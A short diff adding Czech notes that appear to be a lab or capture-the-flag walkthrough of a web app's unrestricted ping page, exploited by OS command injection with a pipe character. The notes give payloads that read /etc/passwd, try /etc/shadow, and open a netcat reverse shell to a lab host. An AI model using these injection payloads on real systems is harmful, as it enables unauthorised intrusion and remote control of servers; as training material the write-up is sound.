@@ -1,0 +1,8 @@
+V proxy si můžete všimnout cookie userrole=user takže mě napadlo, že tu musí být admin strana
+pokud zkusíme /admin zjistíme, že ikdybychom změnili cookie tak je to k ničemu, jelikož je to IP restricted
+Pokud už, ale máme jiný přístup k počítači můžeme zjistit buď heslo k mysql a přidat se mezi IP nebo samotnou stránku admina a co vše na ní můžeme dělat ( teoreticky štěstí když stahujeme přes download ) 
+Zjistíme, že /admin/ping.php není IP restricted
+Ping kontroluje spojení k ip adrese, ale pokud za adresu dáme | tak můžeme změnit výstup.
+Například 127.0.0.1 | cat /etc/passwd nám ukáže všechny uživatele, potenciálně pro další vulns
+Ale bez hesel, ty jsou v shadow, pokud dáme 127.0.0.1 | cat /etc/shadow dostanem prd, protože www-data není sudoer
+Každopádně tady mám free netcat shell - 10.0.2.10 | nc 10.0.2.15 4444 -e /bin/bash
